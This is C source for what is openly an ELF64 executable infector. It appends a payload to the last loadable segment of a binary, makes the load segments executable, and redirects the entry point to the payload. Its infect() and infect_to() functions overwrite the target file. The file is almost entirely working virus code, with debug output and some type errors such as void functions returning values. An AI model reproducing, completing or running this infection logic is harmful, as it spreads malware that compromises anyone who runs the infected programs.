#include "elf64.c"

static void _insert(char **s1, size_t *n1, size_t pos, char *s2, size_t n2){
        char *ns;
        if ((ns = (char *)malloc((*n1) + n2)) == NULL) return FALSE;
        size_t i,j,l;
        for (i = 0; i <= pos; i += 1){ ns[i] = (*s1)[i]; }
        for (j = 0; j < n2; j += 1){ns[i+j] = s2[j]; }
        for (l = 0; i+l < *n1; l += 1){ ns[i+j+l] = (*s1)[i+l]; }
        //clean(*s1);
        *s1 = ns;
        *n1 = (*n1) + n2;
        return TRUE;
}

static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
        char *ns = (char *)malloc((*n) + add);
        size_t i,j,l;
        for (i = 0; i <= pos; i += 1){ ns[i] = (*s)[i]; }
        for (j = 0; j < add; j += 1){ns[i+j] = 0; }
        for (l = 0; i+l < *n; l += 1){ ns[i+j+l] = (*s)[i+l]; }
	*s = ns;
	*n = (*n) + add;
}


void update(char *b, size_t n, size_t old_entry, size_t entry, size_t text_offset, size_t text_length){
	//add a few information about himself
    Elf64_Ehdr *bh = (void*)b;
	size_t pos = elf_offset_entry(b, n);
	int DATA = 0x19;
	//modifying 2bit after
	((size_t*)((char*)(b + pos + DATA)))[0] = max(old_entry,entry) - min(old_entry,entry);
	((size_t*)((char*)(b + pos + DATA)))[1] = entry - pos;
	//printf("diff: %zx, size: %zx\n", entry - pos, n);
	((size_t*)((char*)(b + pos + DATA)))[2] = n;
	((size_t*)((char*)(b + pos + DATA)))[3] = n;
	((size_t*)((char*)(b + pos + DATA)))[4] = n;
	//move to next entry
}

static size_t _prepare(char **s, size_t *n, char *b, size_t bn){
    Elf64_Ehdr *h = (void*)*s;
    Elf64_Phdr *ph = (*(void**)s) + h->e_phoff;

	size_t old_entry = h->e_entry;
    int x = elf_last_load_segment(*s, *n);
    size_t diff = ph[x].p_memsz - ph[x].p_filesz;
    if (diff > 0){
    	//it means the segment will get bigger in mem, but we don't need that so we make it bigger in the file
		_insert_zeros(s,n, ph[x].p_offset+ph[x].p_filesz, diff);
		//reset it
	    Elf64_Ehdr *h = (void*)*s;
		ph = (*(void**)s) + h->e_phoff;
		//change memsize to filesize
		ph[x].p_filesz += diff;
		ph[x].p_memsz = ph[x].p_filesz;
    }
    size_t pos = ph[x].p_offset + ph[x].p_filesz;
	_insert(s, n, pos, b, bn);
	//reset it
    	elf_change_size_last_load_segment(*s, *n, bn);
    	elf_update_flags_of_load_segments(*s, *n);
	elf_set_off_entry(*s, *n, pos + 1 + elf_offset_entry(b, bn));
	elf_shift_offset(*s, *n, pos, bn+diff);
    	h = (void*)*s;
	update((*s) + pos + 1, bn, old_entry, h->e_entry, elf_off_text_section(s,n),elf_offset_entry(s,n));
	//DEBUG
	println("DEBUG: save to l.vi");
	fput("l.vi", (*s) + pos + 1, bn);
	return pos;
}

int infect_to(char *fname, char *to, char *b, size_t bn){
	//if (isFile(fname) == FALSE) return fail("not file");
	//if (isElf64(fname) == FALSE) return fail("not elf64 binary");
	char *s; size_t n;
	if (!fget(fname, &s, &n))
		return FALSE;
	//after insert, update data
	_prepare(&s,&n, b, bn);
	//printf("INSERT NOW!\n");
	println("INSERT in");
	fput(to, s, n);
	return TRUE;
}

void infect(char *fname, char *b, size_t bn){
	infect_to(fname, fname, b, bn);
}
